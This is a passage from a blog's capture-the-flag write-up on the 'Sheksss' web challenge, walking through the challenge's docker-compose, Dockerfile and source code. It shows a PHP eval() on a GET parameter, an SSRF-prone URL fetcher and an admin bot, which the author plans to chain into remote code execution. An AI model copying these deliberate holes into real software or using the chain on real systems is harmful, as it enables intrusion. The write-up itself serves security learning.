@@ -1,0 +1,1106 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/macabely.png">
+  <link rel="icon" href="/img/macabely.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Macabely">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Sheksss Hard web challenge">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fahemsec">
+<meta property="og:url" content="https://xyz-macabely.github.io/2025/09/30/ctfs/sheksss/index.html">
+<meta property="og:site_name" content="Macabely">
+<meta property="og:description" content="Sheksss Hard web challenge">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://xyz-macabely.github.io/images/0/logo.png">
+<meta property="article:published_time" content="2025-09-29T21:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-15T10:18:03.490Z">
+<meta property="article:author" content="Macabely">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xyz-macabely.github.io/images/0/logo.png">
+  
+  
+  
+  <title>Fahemsec - Macabely</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xyz-macabely.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Macabely</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://x.com/Macabely97021" target="_self">
+                <i class="iconfont icon-twitter-fill"></i>
+                <span></span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://www.linkedin.com/in/ali-hassan-02a479219" target="_self">
+                <i class="iconfont icon-linkedin-fill"></i>
+                <span></span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/null') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Fahemsec"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          22k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          182 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Fahemsec</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>While i was scrolling i saw a post about fahemsec being lunched so i decided to take a look, i solved half of the challenges in different categories and now i will publish a writeup about <strong>Sheksss</strong> challenge.<br><img src="/images/0/Screenshot%202025-10-15%20123902.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Sheksss"><a href="#Sheksss" class="headerlink" title="Sheksss"></a>Sheksss</h1><p>Sheksss is a Hard web challenge and it’s about chaining multiple vulnerabilities to get the flag.</p>
+<p>First, i start looking at the app, figuring out what is it about. We have a simple login page:</p>
+<p><img src="/images/0/Screenshot%202025-10-14%20162510.png" srcset="/img/loading.gif" lazyload><br>By registering an account and login, you will see an update profile function where you can update your data and upload an image</p>
+<p><img src="/images/0/Screenshot%202025-10-14%20162958.png" srcset="/img/loading.gif" lazyload></p>
+<p>When you try uploading an image, the request looks like this<br><img src="/images/0/Screenshot%202025-10-14%20195421.png" srcset="/img/loading.gif" lazyload></p>
+<p>Also, you have a create note function</p>
+<p><img src="/images/0/Screenshot%202025-10-14%20163208.png" srcset="/img/loading.gif" lazyload></p>
+<p>When i saw this the first thing comes to my mind is XSS, since it’s a common setup in CTFs where you create notes, call a bot and trigger xss to get the cookies, …etc<br>But i’m still not sure what is this challenge about, time to read the code…</p>
+<p>We have a react app with <strong>tons</strong> of files. when i face something like this, i start looking for the flag (for the sake of time, i will only show the important lines of code).</p>
+<p>First, i read the docker-compose file:</p>
+<div class="code-wrapper"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;3.8&#x27;</span>
+<span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span>
+  <span class="hljs-attribute">php</span><span class="hljs-punctuation">:</span>
+    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">./php-service</span>
+    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./php-service:/var/www/html</span>
+    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">backend</span>
+
+  <span class="hljs-attribute">node</span><span class="hljs-punctuation">:</span>
+    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">./node-service</span>
+    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3000:3000&quot;</span>
+    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./node-service/database.sqlite:/usr/src/app/database.sqlite</span>
+    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">NODE_ENV=production</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">JWT_SECRET=fC2XPcnDItqdZrkezYsKYrZLInUrBkkFrMvzkyABAI8ys</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">ADMIN_PASSWORD=steZ8kvRwQBQIvXnTwqqEawPfAGyxdpe6pYSYP6zHfdj</span>
+    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">backend</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">internal</span>
+
+  <span class="hljs-attribute">proxy</span><span class="hljs-punctuation">:</span>
+    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">nginx:latest</span>
+    <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span>
+    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">81:80</span>
+    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./CTF-XSS-BOT/src:/var/www/html:ro</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./CTF-XSS-BOT/proxy.conf:/etc/nginx/conf.d/default.conf:ro</span>
+    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">internal</span>
+    <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">bot</span>
+
+  <span class="hljs-attribute">bot</span><span class="hljs-punctuation">:</span>
+    <span class="hljs-attribute">build</span><span class="hljs-punctuation">:</span> <span class="hljs-string">./CTF-XSS-BOT/bot</span>
+    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-attribute">APPNAME</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Admin</span>
+      <span class="hljs-attribute">ADMIN_PASSWORD</span><span class="hljs-punctuation">:</span> <span class="hljs-string">steZ8kvRwQBQIvXnTwqqEawPfAGyxdpe6pYSYP6zHfdj</span>
+      <span class="hljs-attribute">APPURL</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http://node:3000/</span>
+      <span class="hljs-attribute">APPURLREGEX</span><span class="hljs-punctuation">:</span> <span class="hljs-string">^http(|s)://node:3000/.*</span>
+      <span class="hljs-attribute">APPLIMIT</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span>
+      <span class="hljs-attribute">APPLIMITTIME</span><span class="hljs-punctuation">:</span> <span class="hljs-string">60</span>
+      <span class="hljs-attribute">USE_PROXY</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span>
+      <span class="hljs-attribute">DISPLAY</span><span class="hljs-punctuation">:</span> <span class="hljs-string">$&#123;DISPLAY&#125;</span>
+    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">internal</span>
+
+<span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span>
+  <span class="hljs-attribute">internal</span><span class="hljs-punctuation">:</span>
+  <span class="hljs-attribute">backend</span><span class="hljs-punctuation">:</span></code></pre></div>
+
+<p>We have three services</p>
+<ol>
+<li>PHP &#x3D;&gt; probably has the flag</li>
+<li>node &#x3D;&gt; the main app</li>
+<li>bot &#x3D;&gt; the admin bot</li>
+</ol>
+<p>I start reading the dockerfile from the PHP service and the flag indeed exist there:</p>
+<div class="code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> php:<span class="hljs-number">8.2</span>-apache
+<span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y libffi-dev</span>
+<span class="hljs-keyword">RUN</span><span class="language-bash"> docker-php-ext-install ffi</span>
+<span class="hljs-keyword">COPY</span><span class="language-bash"> php.ini /usr/local/etc/php/php.ini</span>
+<span class="hljs-keyword">COPY</span><span class="language-bash"> flag.txt /flag.txt</span>
+<span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mv</span> /flag.txt /flag_$(<span class="hljs-built_in">head</span> /dev/urandom | <span class="hljs-built_in">tr</span> -dc a-z0-9 | <span class="hljs-built_in">head</span> -c 16).txt</span>
+<span class="hljs-keyword">COPY</span><span class="language-bash"> index.php /var/www/html/</span>
+<span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span></code></pre></div>
+
+<p>The flag exist in the root dir with a random name in format <code>flag_&lt;random&gt;.txt</code>.</p>
+<p>Okay, we know where the flag is, but what that php service actually do?<br><code>index.php</code>:</p>
+<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>((<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))) 
+&#123;
+    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];
+    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);
+&#125; 
+<span class="hljs-keyword">else</span> 
+&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No code provided.&quot;</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>The service has a <code>code</code> parameter and use <code>eval()</code> on it. We have a command injection here. So the goal is, get access on that php service, trigger command injection achieving RCE and get the flag. But how we can ge access on that service?</p>
+<p>If you looked at the docker-compose file again, you will notice the php service works at the <strong>backend</strong> network (which we don’t have access to), and the node service is the only service that works in the <strong>backend</strong> network and the <strong>internal</strong> network (which we do have access to) at the same time. </p>
+<p>So the node service is like a bridge that can deliver us to the php service. All we need is a function or feature in the node service that we can use to access the php service and execute commands.</p>
+<p>Following…</p>
+<p><code>AdminPanel.tsx</code>:</p>
+<div class="code-wrapper"><pre><code class="hljs tsx">...
+<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"><span class="hljs-attr">e</span>: <span class="hljs-title class_">React</span>.<span class="hljs-title class_">FormEvent</span></span>) =&gt; &#123;
+    e.<span class="hljs-title function_">preventDefault</span>();
+    <span class="hljs-title function_">setError</span>(<span class="hljs-literal">null</span>);
+    <span class="hljs-title function_">setResult</span>(<span class="hljs-literal">null</span>);
+    <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>);
+    <span class="hljs-keyword">try</span> &#123;
+      <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>);
+      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/admin/fetch-url&#x27;</span>, &#123;
+        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,
+        <span class="hljs-attr">headers</span>: &#123;
+          <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,
+          <span class="hljs-string">&#x27;Authorization&#x27;</span>: token ? <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;token&#125;</span>`</span> : <span class="hljs-string">&#x27;&#x27;</span>,
+        &#125;,
+        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; url &#125;),
+      &#125;);
+      <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
+      <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;
+        <span class="hljs-title function_">setError</span>(data.<span class="hljs-property">error</span> || <span class="hljs-string">&#x27;Failed to fetch URL&#x27;</span>);
+      &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-title function_">setResult</span>(data);
+      &#125;
+    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-attr">err</span>: <span class="hljs-built_in">any</span>) &#123;
+      <span class="hljs-title function_">setError</span>(err.<span class="hljs-property">message</span> || <span class="hljs-string">&#x27;Request failed&#x27;</span>);
+    &#125; <span class="hljs-keyword">finally</span> &#123;
+      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);
+    &#125;
+  &#125;;
+
+  <span class="hljs-keyword">return</span> (
+    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;admin-panel-container&quot;</span>&gt;</span></span>
+<span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Admin Panel<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span>
+<span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;handleSubmit&#125;</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;admin-panel-form&quot;</span>&gt;</span></span>
+<span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span></span>
+<span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span>
+<span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;url&#125;</span></span></span>
+<span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> setUrl(e.target.value)&#125;</span>
+<span class="language-xml">          placeholder=&quot;Enter URL to fetch...&quot;</span>
+<span class="language-xml">          className=&quot;admin-url-input&quot;</span>
+<span class="language-xml">          required</span>
+<span class="language-xml">        /&gt;</span>
+<span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;admin-fetch-button&quot;</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">&#123;loading&#125;</span>&gt;</span></span>
+<span class="language-xml">          &#123;loading ? &#x27;Fetching...&#x27; : &#x27;Fetch&#x27;&#125;</span>
+<span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
+<span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
+<span class="language-xml">...</span>
+<span class="language-xml"></span>
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>All Users<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span>
+<span class="language-xml">      &#123;usersError &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;admin-error&quot;</span>&gt;</span>&#123;usersError&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&#125;</span>
+<span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;admin-users-list&quot;</span>&gt;</span></span>
+<span class="language-xml">        &#123;users.map(user =&gt; (</span>
+<span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;user.id&#125;</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;admin-user-item&quot;</span>&gt;</span></span>
+<span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>&#123;user.username&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> (&#123;user.email&#125;)<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span>
+<span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#123;</span>`/<span class="hljs-attr">user</span>/$&#123;<span class="hljs-attr">btoa</span>(<span class="hljs-attr">user.username</span>)&#125;`&#125; <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;noopener noreferrer&quot;</span>&gt;</span>View Profile<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>
+<span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="language-xml">        ))&#125;</span>
+<span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></code></pre></div>
+<p>There is a <code>fetch-url</code> function, we can use this function to access the php service.</p>
+<p>Also, make note of that <code>View Profile</code> feature, we gonna get to it later.</p>
+<p>Let’s read the <code>AdminController.ts</code> file to learn more about these functions:</p>
+<div class="code-wrapper"><pre><code class="hljs ts">...
+  fetchUrl = <span class="hljs-title function_">async</span> (<span class="hljs-attr">req</span>: <span class="hljs-title class_">AuthenticatedRequest</span>, <span class="hljs-attr">res</span>: <span class="hljs-title class_">Response</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; =&gt; &#123;
+    <span class="hljs-keyword">try</span> &#123;
+      <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">isAdmin</span>) &#123;
+        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Admin only&#x27;</span> &#125;);
+        <span class="hljs-keyword">return</span>;
+      &#125;
+      <span class="hljs-keyword">const</span> &#123; url &#125; = req.<span class="hljs-property">body</span>;
+      <span class="hljs-keyword">if</span> (!url || <span class="hljs-keyword">typeof</span> url !== <span class="hljs-string">&#x27;string&#x27;</span>) &#123;
+        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Missing or invalid url&#x27;</span> &#125;);
+        <span class="hljs-keyword">return</span>;
+      &#125;
+...
+      <span class="hljs-comment">// SSRF vulnerable fetch</span>
+      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url, &#123; <span class="hljs-attr">redirect</span>: <span class="hljs-string">&#x27;follow&#x27;</span>, <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span> &#125;);
+      <span class="hljs-keyword">const</span> contentType = response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;content-type&#x27;</span>) || <span class="hljs-string">&#x27;&#x27;</span>;
+      <span class="hljs-keyword">let</span> body;
+      <span class="hljs-keyword">if</span> (contentType.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;application/json&#x27;</span>)) &#123;
+        body = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
+      &#125; <span class="hljs-keyword">else</span> &#123;
+        body = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">text</span>();
+      &#125;
+      res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">status</span>: response.<span class="hljs-property">status</span>, <span class="hljs-attr">headers</span>: <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">fromEntries</span>(response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">entries</span>()), body &#125;);
+    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">any</span>) &#123;
+      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> || <span class="hljs-string">&#x27;Failed to fetch url&#x27;</span> &#125;);
+    &#125;
+
+    <span class="hljs-comment">// GET /api/admin/users</span>
+  listUsers = <span class="hljs-title function_">async</span> (<span class="hljs-attr">req</span>: <span class="hljs-title class_">AuthenticatedRequest</span>, <span class="hljs-attr">res</span>: <span class="hljs-title class_">Response</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; =&gt; &#123;
+    <span class="hljs-keyword">try</span> &#123;
+      <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">isAdmin</span>) &#123;
+        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Admin only&#x27;</span> &#125;);
+        <span class="hljs-keyword">return</span>;
+      &#125;
+      <span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">databaseService</span>.<span class="hljs-title function_">getAllUsers</span>();
+      res.<span class="hljs-title function_">json</span>(users.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">&#123; passwordHash, ...user &#125;</span>) =&gt;</span> user));
+    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">any</span>) &#123;
+      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> || <span class="hljs-string">&#x27;Failed to list users&#x27;</span> &#125;);
+    &#125;
+  &#125;;
+&#125;</code></pre></div>
+<p>We can see the <code>fetchUrl()</code> function is only accessed by admin and it’s vulnerable to SSRF cause it follows the redirect. We can host a server that will redirect into the php service for every visit</p>
+<p>The only one has admin access is the bot and it accepts internal requests only from the node service:</p>
+<p><code>/bot/index.js</code>:</p>
+<div class="code-wrapper"><pre><code class="hljs js">route.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/&quot;</span>, limit, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;
+    <span class="hljs-keyword">const</span> &#123; url &#125; = req.<span class="hljs-property">body</span>;
+    <span class="hljs-keyword">if</span> (!url) &#123;
+        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&quot;Url is missing.&quot;</span> &#125;);
+    &#125;
+    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">RegExp</span>(bot.<span class="hljs-property">urlRegex</span>).<span class="hljs-title function_">test</span>(url)) &#123;
+        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">422</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&quot;URL din&#x27;t match this regex format &quot;</span> + bot.<span class="hljs-property">urlRegex</span> &#125;)
+    &#125;
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> bot.<span class="hljs-title function_">bot</span>(url)) &#123;
+        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-string">&quot;Admin successfully visited the URL.&quot;</span> &#125;);
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&quot;Admin failed to visit the URL.&quot;</span> &#125;);
+    &#125;
+&#125;);</code></pre></div>
